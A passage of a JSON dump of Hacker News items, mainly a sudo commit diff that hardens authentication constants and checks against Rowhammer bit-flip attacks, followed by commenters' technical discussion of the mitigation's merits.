original title, unless it is misleading or linkbait; don't editorialize.\" - https://news.ycombinator.com/newsguidelines.html reply chuckhend 8 hours agoparentprevMy bad. It's still a very interesting read! reply JumpCrisscross 10 hours agoparentprev [–] @dang reply dang 9 hours agorootparent [–] (@dang is a no-op - the only way to get reliable message delivery is hn@ycombinator.com - but fortunately someone did that) reply GuidelinesFAQListsAPISecurityLegalApply to YCContact Search:",
    "originSummary": [
      "Fungi from Antarctica's McMurdo Dry Valleys have demonstrated the ability to survive in conditions resembling those on Mars.",
      "The fungi maintained stable DNA and preserved over 60% of their cells after being sent to the International Space Station for 18 months.",
      "This research offers essential insights for future Mars missions focused on finding signs of life, and lichens from Spain and Austria also exhibited heightened metabolic activity under Martian conditions."
    ],
    "commentSummary": [
      "Fungi from Antarctica have been found to survive in conditions that mimic those on Mars, raising questions about the potential for life on other planets.",
      "This research leads to discussions about seeding other planets with Earth life forms, known as panspermia, and the adaptability of life in space.",
      "The study has implications for planetary protection and our understanding of the possibility of life on other planets."
    ],
    "points": 202,
    "commentCount": 129,
    "retryCount": 0,
    "time": 1706469478
  },
  {
    "id": 39165342,
    "title": "Sudo project strengthens security against Rowhammer attacks with code modifications",
    "originLink": "https://github.com/sudo-project/sudo/commit/7873f8334c8d31031f8cfa83bd97ac6029309e4f",
    "originBody": "sudo-project / sudo Public Notifications Fork 191 Star 1k Code Issues 18 Pull requests 1 Actions Projects Security Insights Commit Permalink Browse files Try to make sudo less vulnerable to ROWHAMMER attacks. We now use ROWHAMMER-resistent values for ALLOW, DENY, AUTH_SUCCESS, AUTH_FAILURE, AUTH_ERROR and AUTH_NONINTERACTIVE. In addition, we explicitly test for expected values instead of using a negated test against an error value. In the parser match functions this means explicitly checking for ALLOW or DENY instead of accepting anything that is not set to UNSPEC. Thanks to Andrew J. Adiletta, M. Caner Tol, Yarkin Doroz, and Berk Sunar, all affiliated with the Vernam Applied Cryptography and Cybersecurity Lab at Worcester Polytechnic Institute, for the report. Paper preprint: https://arxiv.org/abs/2309.02545 Loading branch information millert committed 1 parent 525803d commit 7873f83 Showing 6 changed files with 96 additions and 54 deletions. Whitespace Ignore whitespace Split Unified plugins/sudoers auth passwd.c sudo_auth.c sudo_auth.h lookup.c match.c parse.h 27 changes: 17 additions & 10 deletions 27 plugins/sudoers/auth/passwd.c@@ -68,7 +68,7 @@ sudo_passwd_verify(const struct sudoers_context *ctx, struct passwd *pw, char des_pass[9], *epass; char *pw_epasswd = auth->data; size_t pw_len; int matched = 0; int ret; debug_decl(sudo_passwd_verify, SUDOERS_DEBUG_AUTH);/* An empty plain-text password must match an empty encrypted password. */@@ -80,7 +80,7 @@ sudo_passwd_verify(const struct sudoers_context *ctx, struct passwd *pw, */ pw_len = strlen(pw_epasswd); if (pw_len == DESLEN || HAS_AGEINFO(pw_epasswd, pw_len)) { strlcpy(des_pass, pass, sizeof(des_pass)); (void)strlcpy(des_pass, pass, sizeof(des_pass)); pass = des_pass; } @@ -90,30 +90,37 @@ sudo_passwd_verify(const struct sudoers_context *ctx, struct passwd *pw, * only compare the first DESLEN characters in that case. */ epass = (char *) crypt(pass, pw_epasswd); ret = AUTH_FAILURE; if (epass != NULL) { if (HAS_AGEINFO(pw_epasswd, pw_len) && strlen(epass) == DESLEN) matched = !strncmp(pw_epasswd, epass, DESLEN); else matched = !strcmp(pw_epasswd, epass); if (HAS_AGEINFO(pw_epasswd, pw_len) && strlen(epass) == DESLEN) { if (strncmp(pw_epasswd, epass, DESLEN) == 0) ret = AUTH_SUCCESS; } else { if (strcmp(pw_epasswd, epass) == 0) ret = AUTH_SUCCESS; } }explicit_bzero(des_pass, sizeof(des_pass));debug_return_int(matched ? AUTH_SUCCESS : AUTH_FAILURE); debug_return_int(ret); } #else int sudo_passwd_verify(const struct sudoers_context *ctx, struct passwd *pw, const char *pass, sudo_auth *auth, struct sudo_conv_callback *callback) { char *pw_passwd = auth->data; int matched; int ret; debug_decl(sudo_passwd_verify, SUDOERS_DEBUG_AUTH);/* Simple string compare for systems without crypt(). */ matched = !strcmp(pass, pw_passwd); if (strcmp(pass, pw_passwd) == 0) ret = AUTH_SUCCESS; else ret = AUTH_FAILURE;debug_return_int(matched ? AUTH_SUCCESS : AUTH_FAILURE); debug_return_int(ret); } #endif51 changes: 36 additions & 15 deletions 51 plugins/sudoers/auth/sudo_auth.c@@ -116,10 +116,16 @@ sudo_auth_init(const struct sudoers_context *ctx, struct passwd *pw, if (auth->init && !IS_DISABLED(auth)) { /* Disable if it failed to init unless there was a fatal error. */ status = (auth->init)(ctx, pw, auth); if (status == AUTH_FAILURE) switch (status) { case AUTH_SUCCESS: break; case AUTH_FAILURE: SET(auth->flags, FLAG_DISABLED); else if (status == AUTH_ERROR) break; /* assume error msg already printed */ break; default: /* Assume error msg already printed. */ debug_return_int(-1); } } } @@ -166,7 +172,7 @@ sudo_auth_init(const struct sudoers_context *ctx, struct passwd *pw, } }debug_return_int(status == AUTH_ERROR ? -1 : 0); debug_return_int(0); }/*@@ -209,7 +215,7 @@ sudo_auth_cleanup(const struct sudoers_context *ctx, struct passwd *pw, for (auth = auth_switch; auth->name; auth++) { if (auth->cleanup && !IS_DISABLED(auth)) { int status = (auth->cleanup)(ctx, pw, auth, force); if (status == AUTH_ERROR) { if (status != AUTH_SUCCESS) { /* Assume error msg already printed. */ debug_return_int(-1); }@@ -306,7 +312,7 @@ verify_user(const struct sudoers_context *ctx, struct passwd *pw, char *prompt, SET(auth->flags, FLAG_DISABLED); else if (status == AUTH_NONINTERACTIVE) goto done; else if (status == AUTH_ERROR || user_interrupted()) else if (status != AUTH_SUCCESS || user_interrupted()) goto done; /* assume error msg already printed */ } }@@ -365,7 +371,6 @@ verify_user(const struct sudoers_context *ctx, struct passwd *pw, char *prompt, case AUTH_NONINTERACTIVE: SET(validated, FLAG_NO_USER_INPUT); FALLTHROUGH; case AUTH_ERROR: default: log_auth_failure(ctx, validated, 0); ret = -1;@@ -377,25 +382,33 @@ verify_user(const struct sudoers_context *ctx, struct passwd *pw, char *prompt,/* * Call authentication method begin session hooks. * Returns 1 on success and -1 on error. * Returns true on success, false on failure and -1 on error. */ int sudo_auth_begin_session(const struct sudoers_context *ctx, struct passwd *pw, char **user_env[]) { sudo_auth *auth; int ret = true; debug_decl(sudo_auth_begin_session, SUDOERS_DEBUG_AUTH);for (auth = auth_switch; auth->name; auth++) { if (auth->begin_session && !IS_DISABLED(auth)) { int status = (auth->begin_session)(ctx, pw, user_env, auth); if (status != AUTH_SUCCESS) { switch (status) { case AUTH_SUCCESS: break; case AUTH_FAILURE: ret = false; break; default: /* Assume error msg already printed. */ debug_return_int(-1); ret = -1; break; } } } debug_return_int(1); debug_return_int(ret); }bool@@ -416,25 +429,33 @@ sudo_auth_needs_end_session(void)/* * Call authentication method end session hooks. * Returns 1 on success and -1 on error. * Returns true on success, false on failure and -1 on error. */ int sudo_auth_end_session(void) { sudo_auth *auth; int ret = true; int status; debug_decl(sudo_auth_end_session, SUDOERS_DEBUG_AUTH);for (auth = auth_switch; auth->name; auth++) { if (auth->end_session && !IS_DISABLED(auth)) { status = (auth->end_session)(auth); if (status == AUTH_ERROR) { switch (status) { case AUTH_SUCCESS: break; case AUTH_FAILURE: ret = false; break; default: /* Assume error msg already printed. */ debug_return_int(-1); ret = -1; break; } } } debug_return_int(1); debug_return_int(ret); }/* 12 changes: 6 additions & 6 deletions 12 plugins/sudoers/auth/sudo_auth.h@@ -19,12 +19,12 @@ #ifndef SUDO_AUTH_H #define SUDO_AUTH_H/* Auth function return values. */ #define AUTH_SUCCESS 0 #define AUTH_FAILURE 1 #define AUTH_INTR 2 #define AUTH_ERROR 3 #define AUTH_NONINTERACTIVE 4 /* Auth function return values (rowhammer resistent). */ This comment has been minimized. Sign in to view pavlinux • edited Makefile: gcc -DRND1=0x$(openssl rand -hex 4) \\ -DRND2=0x$(openssl rand -hex 4) \\ -DRND3=0x$(openssl rand -hex 4) \\ -DRND4=0x$(openssl rand -hex 4) \\ -DRND5=0x$(openssl rand -hex 4) ... sudo_auth.h #define AUTH_SUCCESS RND1 /* х.з. */ #define AUTH_FAILURE RND2 /* х.з. */ #define AUTH_INTR RND3 /* х.з. */ #define AUTH_ERROR RND4 /* х.з. */ #define AUTH_NONINTERACTIVE RND5 /* х.з. */ 4 This comment has been minimized. Sign in to view millert Author Collaborator The values used were chosen such that it takes a large number of bit flips to change from allowed to denied. Using random values doesn't really protect against this attack. 3 1 2 #define AUTH_SUCCESS 0x52a2925 /* 0101001010100010100100100101 */ #define AUTH_FAILURE 0xad5d6da /* 1010110101011101011011011010 */ #define AUTH_INTR 0x69d61fc8 /* 1101001110101100001111111001000 */ #define AUTH_ERROR 0x1629e037 /* 0010110001010011110000000110111 */ #define AUTH_NONINTERACTIVE 0x1fc8d3ac /* 11111110010001101001110101100 */typedef struct sudo_auth { unsigned int flags; /* various flags, see below */ 12 changes: 6 additions & 6 deletions 12 plugins/sudoers/lookup.c@@ -100,7 +100,7 @@ sudoers_lookup_pseudo(struct sudo_nss_list *snl, struct sudoers_context *ctx, int user_match = userlist_matches(nss->parse_tree, ctx->user.pw, &us->users); if (user_match != ALLOW) { if (callback != NULL && user_match != UNSPEC) { if (callback != NULL && user_match == DENY) { callback(nss->parse_tree, us, user_match, NULL, UNSPEC, NULL, UNSPEC, UNSPEC, UNSPEC, cb_data); }@@ -189,7 +189,7 @@ sudoers_lookup_pseudo(struct sudo_nss_list *snl, struct sudoers_context *ctx, host_match, cs, date_match, runas_match, cmnd_match, cb_data); } if (cmnd_match != UNSPEC) { if (SPECIFIED(cmnd_match)) { /* * We take the last match but must process * the entire policy for pwcheck == all.@@ -245,7 +245,7 @@ sudoers_lookup_check(struct sudo_nss *nss, struct sudoers_context *ctx, TAILQ_FOREACH_REVERSE(us, &nss->parse_tree->userspecs, userspec_list, entries) { int user_match = userlist_matches(nss->parse_tree, ctx->user.pw, &us->users); if (user_match != ALLOW) { if (callback != NULL && user_match != UNSPEC) { if (callback != NULL && user_match == DENY) { callback(nss->parse_tree, us, user_match, NULL, UNSPEC, NULL, UNSPEC, UNSPEC, UNSPEC, cb_data); }@@ -290,7 +290,7 @@ sudoers_lookup_check(struct sudo_nss *nss, struct sudoers_context *ctx, cs, date_match, runas_match, cmnd_match, cb_data); }if (cmnd_match != UNSPEC) { if (SPECIFIED(cmnd_match)) { /* * If user is running command as themselves, * set ctx->runas.pw = ctx->user.pw.@@ -542,15 +542,15 @@ sudoers_lookup(struct sudo_nss_list *snl, struct sudoers_context *ctx,m = sudoers_lookup_check(nss, ctx, &validated, &info, now, callback, cb_data, &cs, &defs); if (m != UNSPEC) { if (SPECIFIED(m)) { match = m; parse_tree = nss->parse_tree; }if (!sudo_nss_can_continue(nss, m)) break; } if (match != UNSPEC) { if (SPECIFIED(match)) { if (info.cmnd_path != NULL) { /* Update cmnd, cmnd_stat, cmnd_status from matching entry. */ free(ctx->user.cmnd); 25 changes: 13 additions & 12 deletions 25 plugins/sudoers/match.c@@ -91,7 +91,7 @@ user_matches(const struct sudoers_parse_tree *parse_tree, if ((a = alias_get(parse_tree, m->name, USERALIAS)) != NULL) { /* XXX */ const int rc = userlist_matches(parse_tree, pw, &a->members); if (rc != UNSPEC) { if (SPECIFIED(rc)) { if (m->negated) { matched = rc == ALLOW ? DENY : ALLOW; } else {@@ -123,7 +123,8 @@ userlist_matches(const struct sudoers_parse_tree *parse_tree, debug_decl(userlist_matches, SUDOERS_DEBUG_MATCH);TAILQ_FOREACH_REVERSE(m, list, member_list, entries) { if ((matched = user_matches(parse_tree, pw, m)) != UNSPEC) matched = user_matches(parse_tree, pw, m); if (SPECIFIED(matched)) break; } debug_return_int(matched);@@ -184,7 +185,7 @@ runas_userlist_matches(const struct sudoers_parse_tree *parse_tree, if (a != NULL) { const int rc = runas_userlist_matches(parse_tree, &a->members, matching_user); if (rc != UNSPEC) { if (SPECIFIED(rc)) { if (m->negated) { user_matched = rc == ALLOW ? DENY : ALLOW; } else {@@ -211,7 +212,7 @@ runas_userlist_matches(const struct sudoers_parse_tree *parse_tree, user_matched = m->negated ? DENY : ALLOW; break; } if (user_matched != UNSPEC) { if (SPECIFIED(user_matched)) { if (matching_user != NULL && m->type != ALIAS) *matching_user = m; break;@@ -246,7 +247,7 @@ runas_grouplist_matches(const struct sudoers_parse_tree *parse_tree, if (a != NULL) { const int rc = runas_grouplist_matches(parse_tree, &a->members, matching_group); if (rc != UNSPEC) { if (SPECIFIED(rc)) { if (m->negated) { group_matched = rc == ALLOW ? DENY : ALLOW; } else {@@ -262,14 +263,14 @@ runas_grouplist_matches(const struct sudoers_parse_tree *parse_tree, group_matched = m->negated ? DENY : ALLOW; break; } if (group_matched != UNSPEC) { if (SPECIFIED(group_matched)) { if (matching_group != NULL && m->type != ALIAS) *matching_group = m; break; } } } if (group_matched == UNSPEC) { if (!SPECIFIED(group_matched)) { struct gid_list *runas_groups; /* * The runas group was not explicitly allowed by sudoers.@@ -349,7 +350,7 @@ hostlist_matches_int(const struct sudoers_parse_tree *parse_tree,TAILQ_FOREACH_REVERSE(m, list, member_list, entries) { matched = host_matches(parse_tree, pw, lhost, shost, m); if (matched != UNSPEC) if (SPECIFIED(matched)) break; } debug_return_int(matched);@@ -402,7 +403,7 @@ host_matches(const struct sudoers_parse_tree *parse_tree, /* XXX */ const int rc = hostlist_matches_int(parse_tree, pw, lhost, shost, &a->members); if (rc != UNSPEC) { if (SPECIFIED(rc)) { if (m->negated) { matched = rc == ALLOW ? DENY : ALLOW; } else {@@ -440,7 +441,7 @@ cmndlist_matches(const struct sudoers_parse_tree *parse_tree,TAILQ_FOREACH_REVERSE(m, list, member_list, entries) { matched = cmnd_matches(parse_tree, m, runchroot, info); if (matched != UNSPEC) if (SPECIFIED(matched)) break; } debug_return_int(matched);@@ -471,7 +472,7 @@ cmnd_matches(const struct sudoers_parse_tree *parse_tree, a = alias_get(parse_tree, m->name, CMNDALIAS); if (a != NULL) { rc = cmndlist_matches(parse_tree, &a->members, runchroot, info); if (rc != UNSPEC) { if (SPECIFIED(rc)) { if (m->negated) { matched = rc == ALLOW ? DENY : ALLOW; } else {@@ -511,7 +512,7 @@ cmnd_matches_all(const struct sudoers_parse_tree *parse_tree, if (a != NULL) { TAILQ_FOREACH_REVERSE(m, &a->members, member_list, entries) { matched = cmnd_matches_all(parse_tree, m, runchroot, info); if (matched != UNSPEC) { if (SPECIFIED(matched)) { if (negated) matched = matched == ALLOW ? DENY : ALLOW; break; 0 comments on commit 7873f83 Please sign in to comment.",
    "commentLink": "https://news.ycombinator.com/item?id=39165342",
    "commentBody": "Try to make sudo less vulnerable to Rowhammer attacks (github.com/sudo-project)163 points by trebligdivad 20 hours agohidepastfavorite115 comments userbinator 6 hours agoNo. Do not want. Rowhammer is a hardware problem ---- defective RAM --- not a software one. The sooner everyone starts returning defective RAM and putting pressure on the hardware manufacturers to maintain correctness, the sooner we can stop this descent into insanity. \"They can always work around it in software\" is the attitude that let Rowhammer exist, and continuing to fulfill that expectation will only make things worse. reply bogantech 2 hours agoparent> Rowhammer is a hardware problem ---- defective RAM --- not a software one. It always amazes me how people can be so confident yet so wrong. It's a problem of physics - there's various ways to try to mitigate it but the only way to completely avoid it would probably be to use SRAM and that is going to be extremely expensive when talking 16GB and not nearly dense enough. It's not some conspiracy by \"Big RAM\" reply mikewarot 3 hours agoparentprevCame here to say the same thing... take my up-vote. ;-) reply stressinduktion 18 hours agoprevRelated, hardbool, it seems gcc can automatically handle this soon. https://blog.adacore.com/adacore-enhances-gcc-security-with-... and https://gcc.gnu.org/onlinedocs/gcc/Common-Type-Attributes.ht... reply loeg 17 hours agoparentNot exactly; these constants in sudo are an enum of sorts (actually preprocessor macros). It's not just bool (and won't just be bool in many situations). It is cool to see GCC exploring automatic protection in this space; I just don't think it is relevant to what sudo did here. reply IshKebab 15 hours agorootparentHardbool lets you use custom true and false representations with higher hamming distances. The sudo patch uses custom representations for their enum that have higher hamming distances. The only difference is that hardbool is for true/false and this patch is for AUTH_SUCCESS/AUTH_FAILURE/AUTH_ERROR etc. But that's irrelevant. It's the exact same technique. reply loeg 12 hours agorootparent> The only difference is that hardbool is for true/false and this patch is for AUTH_SUCCESS/AUTH_FAILURE/AUTH_ERROR etc. But that's irrelevant. It's very relevant! The problematic comparison in this code isn't true/false! A feature that only protects true/false does not help here. reply Vecr 2 hours agorootparentDefine the enum to be represented as a two's complement integer made of hardbools. reply foota 9 hours agorootparentprevCouldn't you combine bools for bitwise masks to get this? reply jareklupinski 18 hours agoprevi enjoyed this part: #define AUTH_SUCCESS 0x52a2925 /\\* 0101001010100010100100100101 */ #define AUTH_FAILURE 0xad5d6da /* 1010110101011101011011011010 */ #define AUTH_INTR 0x69d61fc8 /* 1101001110101100001111111001000 */ #define AUTH_ERROR 0x1629e037 /* 0010110001010011110000000110111 */ #define AUTH_NONINTERACTIVE 0x1fc8d3ac /* 11111110010001101001110101100 \\*/ going to see how i can work this into a project :) reply lifthrasiir 6 hours agoparentI'm not sure how those values are derived. Yes, the Hamming distances between them should be maximized, but the current values don't seem to be optimized for that: SUCC FAIL INTR ERR NONI 0 28 20 11 16 AUTH_SUCCESS 28 0 12 19 14 AUTH_FAILURE 20 12 0 31 16 AUTH_INTR 11 19 31 0 15 AUTH_ERROR 16 14 16 15 0 AUTH_NONINTERACTIVE Sure, AUTH_SUCCESS and AUTH_FAILURE have a Hamming distance of 28, but it takes only 11 or 16 bit flips to go from AUTH_ERROR or AUTH_NONINTERACTIVE to AUTH_SUCCESS. (AUTH_ERROR can only happen from an internal error, so I believe AUTH_NONINTERACTIVE is easier to trigger.) A quick Python search was able to find some alternatives: 0x0f7b74c5 0x810d2b99 0x63a64616 0xcab4a865 0xbe705abb ...maximizes all distances (17--19) 0x28d803a4 0x352ef6d3 0xdb61dce1 0xb3edf85c 0xe62f7508 ...maximizes a distance from the first and others (21--22), disregarding other pairs (14--21) It seems that fixing one element to be a bitwise negation of the first element is not a good search tactic in my short testing. Also as notpushkin noted, if you really want to disregard other pairs you should just make one pair with the maximal distance and derive every other code from them (say, -1 0 1 2 3 would work for this purpose). By the way, finding a binary code with maximal Hamming distance is an open problem [1] [2]. [1] https://www.win.tue.nl/%7Eaeb/codes/binary-1.html [2] https://math.stackexchange.com/questions/4288902/generation-... reply TacticalCoder 17 hours agoparentprev> I enjoyed this part Very nice indeed. Such a simple mitigation and it makes evil people sad, which makes me happy. reply dist-epoch 16 hours agorootparentThis is for local sudo privilege escalation. If the attacker is already running code on your system, you kind of lost anyway. reply nuccy 15 hours agorootparentNot really. An example out of top of my head, where this still might be useful are login nodes (used in many research clusters to allow users to enter and sumbit jobs) or shared web-hosting servers (few of those definitely still exist). There legitimate non-privileged users can run their programs and the end goal is to prevent them from getting root. reply wongarsu 11 hours agorootparentThe last time I looked at the statistics the majority of the internet was still running on PHP, mostly wordpress installs. I'm willing to bet those are mostly on shared hosting with accounts separated by nothing but their linux user. reply charcircuit 12 hours agorootparentprevAnother common one is for example minecraft / source engine game server hosts as they commonly allow customers to install mods. reply _3u10 7 hours agorootparentprevMost of the cloud works this way unless you are using bare metal / largest size instances. reply ufo 10 hours agoparentprevI'm slightly bothered that the numbers don't have the same number of digits. The rows are not perfectly aligned! reply notpushkin 9 hours agorootparentI'm also wondering why the bits are alternated in the numbers. Why can't we just set AUTH_SUCCESS to 0xffffffff and all the denied / error states to mostly-zeros? reply trebligdivad 18 hours agoparentprevThat's the section that made me post this snippet; crazy isn't it?! reply jareklupinski 11 hours agorootparentcan't edit original post, but i just realized after lining up the monospace how #define AUTH_SUCCESS 0x52a2925 /* 0101001010100010100100100101 */ #define AUTH_FAILURE 0xad5d6da /* 1010110101011101011011011010 */ #define AUTH_INTR 0x69d61fc8 /* 1101001110101100001111111001000 */ #define AUTH_ERROR 0x1629e037 /* 0010110001010011110000000110111 */ #define AUTH_NONINTERACTIVE 0x1fc8d3ac /* 11111110010001101001110101100 */ AUTH_FAILURE is still just !AUTH_SUCCESS (and almost a palindrome) reply kelnos 6 hours agorootparentIt sorta is, but isn't actually, sadly. I mean, if they were 28-bit values, they'd be binary complements, but they're actually 32-bit values, so they're really: #define AUTH_SUCCESS 0x052a2925 /* 00000101001010100010100100100101 */ #define AUTH_FAILURE 0x0ad5d6da /* 00001010110101011101011011011010 */ Doing a '!' operation in C on one of them won't yield the other value unless you also zero out the top 4 bits. Close enough, though... I still enjoy the symmetry as you did. Anyway, I'm curious why three of the values they chose have all zeroes for the top 4 bits. I wonder if there's a security-related reason for that. reply zaroth 6 hours agorootparentprevI think the theory is that means the most number of bits need to be flipped. Because rowhammer is attacking the physical memory structure, it can’t function at the level that knows what AUTH_SUCCESS is. This attack just targets raw bits, so we need to protect these crucial state variables from bit-flips. reply throwaway421967 17 hours agoparentprevI don't get it, what's special about these numbers? reply rsaxvc 17 hours agorootparentTakes many bit flips to go from one pattern to another. reply throwaway421967 17 hours agorootparentIf that is the only constraint, wouldn't the goal be to be as far as possible from the only success state? the distance between success and failure is 28 reply themoonisachees 9 hours agorootparentMaybe, but in practice malware that makes sudo always fail is also bad. At the same time, getting 28 precise distance from row hammer is basically impossible. reply jareklupinski 17 hours agorootparentprevi think their bitfields seem specifically chosen to mitigate rowhammer attacks (no repeating elements)? reply hlandau 20 hours agoprevThis is deeply interesting. I've sometimes contemplated the possibility of doing things like this to guard against memory errors causing mis-entry to particularly critical control flow paths - this is certainly an example of that. But never heard of anyone actually trying to do this until now. A \"how to write rowhammer-resistant code\" writeup would definitely be useful here - even if it is definitely something people cannot do for anything, I can certainly see cases where there is a case for it. reply wongarsu 11 hours agoparentI remember someone making a rust library for hardened bools, though with the idea of protecting against protecting against random bitflips, not targeted rowhammer attacks (though it should work about the same). The feedback from the rust subreddit was basically protecting the bool but not the if statement is of limited use. Potentially it can even make it worse, since there is now more code being executed that might become bitflipped. That inspired me to make a crate that periodically checksums your program code while it's running, to make sure it hasn't changed. Got it working on Windows and Linux, but then it ended up like most side projects. Maybe I should polish it up and publish it. reply Palomides 18 hours agoparentprevit's a long-known hazard in embedded and highly reliable systems, there are terms like \"single-event upset\" that might lead you in interesting directions reply addaon 17 hours agorootparentSingle event upsets are well-understood and easy (although not necessarily cheap) to mitigate in hardware -- ECC for RAM, CRCs for data in flight, and voting (or lockstep if detection is sufficeint) for computation. The challenge with Rowhammer is that it involves multiple, correlated bit flips; and depending on details of your system the correlations may be disguised by various remapping layers. reply HankB99 19 hours agoprevI thought that Rowhammer was a thing of the past. Out of curiosity I found code to test for this and ran it on some of my hosts. My old desktop - I7-4770K/DDR3 - was susceptible. My old server - Xeon X3460/DDR3+ECC - was not. I upgraded the desktop with components based on a Ryzen 7 7700X/DDR5. It tested not susceptible. I'm not sure if that's a result of RAM designed not to be susceptible or that (I think) DDR5 RAM uses modules with on die ECC. I was not able to test any of my Raspberry Pis because the test code used some facility available on the AMD64 architecture that is not available on the ARM64 processors. The newer Pi 4B and 5 use modules with on die ECC. It seems to me that ECC should prevent Rowhammer susceptibility. That should prevent it on server grade H/W for anything still in service and newer consumer systems. I have no idea if Rowhammer affects other architectures than AMD64. reply thijsr 18 hours agoparentRowHammer is not a thing of the past. In fact, modern DRAM chips are significantly more susceptible to RowHammer due to their increased chip density [1]. [1] https://arxiv.org/abs/2005.13121 reply omoikane 14 hours agorootparentIn the \"countermeasures\" section of the linked paper[1], it mentioned that there are some new techniques available, but repeatedly mentioned that they are not yet available in consumer systems. Maybe rowhammer will eventually be a thing of the past despite the increasing chip density. [1] https://arxiv.org/abs/2309.02545 reply HankB99 15 hours agorootparentprevThanks for the link. I guess I thought wrong. But I have more questions. > with RowHammer protection mechanisms disabled I wonder what this means. Is it S/W mitigations or does it include H/W factors like disabling on-die ECC. It makes sense to me that with all other things being equal that higher density would lead to more susceptibility to Rowhammer. But as always, other things are not equal. I expect that on-die ECC would reduce susceptibility to Rowhammer and AFAIK that is used for DDR4 and DDR5 RAM, but perhaps not exclusively. Or did disabling \"protection mechanisms\" include disabling that (if it is even possible.) reply sweetjuly 5 hours agorootparentThe mitigations are usually about limiting the number of times you can access without refreshing. ECC helps in detecting and correcting (obviously) but it doesn't solve the underlying issue that accessing a cell over and over can cause bit flips in neighbors. ECC can be defeated if uncorrectable errors are not fatal or if the attacker can just crash the system over and over. Being able to introduce memory errors is a fundamental and unmitigatable issue that must be resolved by making these errors impossible. This isn't a problem software can solve. reply tlb 16 hours agoparentprevLPDDR4 and above are supposed to have a feature to detect too many accesses to the same few rows and initiate a refresh cycle. Implementation quality may vary. reply xgk 11 hours agorootparentIt has been possible to re-purpose such additional refresh cycles as an additional Rowhammer attack vector, see https://www.usenix.org/conference/usenixsecurity22/presentat... reply Dylan16807 9 hours agorootparentSo on RAM that needed 18,000 distance-1 accesses, they were able to mount an effective attack with 300,000 distance-2 accesses and 5000 distance-1 accesses. That's not a particularly big assist, and doesn't sound hard to mitigate. If TRR pushed the rows it refreshes 10% closer to triggering their own TRR, then those 300,000 accesses would have triggered multiple refreshes in the target row. reply xgk 12 hours agorootparentprevHave you ever seen any even moderately detailed specification of what the DRAM manufacturers do in this regard? I have not, and I looked. I am deeply sceptical .... I don't believe that Rowhammer mitigations happen inside the DRAM chips themselves, I think that they are being put into the memory controller that talks to DRAM. Since DRAMs with built-in Rowhammer defences would have to spend transistors on this defence, those transistors would be 'wasted' in situations where Rowhammer is not part of the attacker model. reply tlb 11 hours agorootparentIt makes sense to put it in the DRAM controller for many reasons. One is that the DRAM silicon process is optimized for memory but terrible for logic. Also, a DRAM bank is several chips in parallel to get the data bus width, and they would all have to duplicate the logic. The disadvantage is that the controller and memory are made by different companies, so standards are required to agree on what access patterns are acceptable. reply xgk 11 hours agorootparentAgree. The extreme secrecy of DRAM manufacturers about the innards of their chips puts an additional obstacles in the way of memory controllers (MCs) implementing efficient Rowhammer defences. In particular, if the MC doesn't know which addresses are corresponding to neighbouring rows, how can an MC know with certainty that any concrete row is being attacked? (And, to the best of my knowledge, DRAM manufacturers don't give away this information.) reply Dylan16807 9 hours agorootparentprevMy understanding from some previous papers was that many chips put in a small hash table to count accesses, and this table could be worked around. It's easy enough to deal with if they stop cheaping out. Each row is so wide. A 10 bit counter to trigger neighbor refreshes would barely take any space. reply trebligdivad 19 hours agoparentprevRowhammer is not architecture specific, since it's the DRAM rather than the CPU. The paper linked in the patch references other works showing every defence at rowhammer can be bypassed somehow (I've not followed them all) - e.g. it specifically says that ECC and the like can be bypassed. reply HankB99 15 hours agorootparentInteresting. I did not expect that Rowhammer was architecture specific, only that the test I found was. I also did not expect that the various defenses, including ECC, could be bypassed. reply adrian_b 11 hours agorootparentIt cannot be completely bypassed. The attacker cannot control precisely which bits will be erroneous. When much more than 2 bits become erroneous, in a small fraction of the cases no error will be detected but a wrong value will be read at the next access. However, in the majority of the cases an error will be detected, either non-correctable, or correctable in which case the corrected value will be wrong. Despite the fact that wrong corrections are possible, in a system with ECC that is configured correctly it should be impossible for a RowHammer attack to escape detection, unlike for a system without ECC memory. On a computer that is not defective, memory errors happen very seldom, typically one error after many months. Even only 2 correctable errors that happen in the same day represent an event that can be explained only by either a RowHammer attack or by a memory module that has become defective. Therefore, a well configured computer with ECC memory should alert immediately its administrator when 2 on more errors happen in the same day, even if they had been correctable errors, because this requires immediate action, either stopping a RowHammer attack or replacing the defective memory module. It would be pretty much impossible for any RowHammer attack to attain its target without triggering 2 or more ECC errors, which will reveal the attack attempt. Only when there is no ECC the attack can proceed undetected for a time long enough to be successful. reply dist-epoch 16 hours agoparentprevAre you running the Ryzen DDR5 at stock speeds (4800 MT/s) or at some XMP profile. reply HankB99 15 hours agorootparentEverything is at stock speed. reply deadliftdouche 6 hours agoprevI don't understand, isn't this pointless? I could just change some other data structure or variable, hell, I'll just change the sudo input buffer size and do a stack overflow, or a memcpy size into a heap overflow, or what stops me changing a jne (Jump if Not Equal) instruction to a jg (Jump if Greater) and bypassing the if's? reply deadliftdouche 6 hours agoparentI'd argue its worse than pointless, at best it does nothing and at worse it seems to make the code harder to understand and audit, which could result in more future vulnerabilities. reply Beldin 3 hours agorootparentThe associated paper abstract claims to have broken sudo by rowhammering register values. It stands to reason that these mitigations thwart the found attacks - the commit message points to the paper as the reason for these mitigations, after all. Preventing known attacks is not pointless at all. reply userbinator 5 hours agoparentprevIndeed. Trying to write code that can essentially work correctly with arbitrary memory corruption is not something that should even be attempted. reply commandersaki 9 hours agoprevPeter Gutmann goes over this type of mitigation in the context of glitch attacks: https://www.youtube.com/live/IyeDSyvYvZs?si=wkapFNXp8-N28vEb... reply pid1wow 12 hours agoprevGiven that the most common use of sudo is to give yourself root to run a command, and malware looking to elevate root can just rig up ~/.bashrc, what use is this patch? What use cases does it apply to and how common are they? reply wongarsu 11 hours agoparentSudo has much more fine-grained abilities for more surgical use-cases, like giving users the ability to only execute certain commands as a certain user, with detailed logging and auditing. It has a pretty involved config file (the pdf docu for it is 80 pages long), a plugin system, a seperate log format and log server, etc I also believe those use-cases aren't that common anymore since multi-user systems fell out of favor. There is an argument that most of us could use a vastly simpler tool instead to reduce the attack surface. But that tool wouldn't be sudo, because sudo is built around supporting all these use cases. reply bpye 11 hours agorootparentdoas [0, 1] in OpenBSD is somewhat simpler. [0] - https://man.openbsd.org/doas.1 [1] - https://man.openbsd.org/doas.conf.5 reply idatum 7 hours agorootparentdoas.conf makes things clear to me what I'm enabling. And we have the OpenBSD folks focused on clarity and security. reply alwillis 9 hours agorootparentprevSwitched to doas a couple of months ago on my FreeBSD box; it’s been a seamless switch. reply cedws 11 hours agoparentprev>and malware looking to elevate root can just rig up ~/.bashrc, what use is this patch? Apologies for self promotion, but I wrote a relevant blog post that discusses this[0]. Is there any way of mitigating this trivial attack? I 